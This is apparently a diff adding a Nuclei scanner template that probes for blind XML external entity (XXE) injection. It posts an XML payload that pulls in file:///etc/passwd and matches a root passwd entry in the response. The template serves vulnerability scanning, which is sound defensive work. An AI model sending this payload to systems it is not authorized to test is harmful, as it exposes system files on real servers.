@@ -1,0 +1,33 @@
+id: Bruteforce-xxe
+
+info:
+  name: Generic Bruteforce XXE
+  author: vijay
+  severity: high
+  tags: xxe,generic,blind
+  metadata:
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST  HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml,text/xml;q=0.9,*/*;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Content-Type: application/xml
+        Referer: {{BaseURL}}
+        Pragma: no-cache
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY>
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <foo>&xxe;</foo>
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
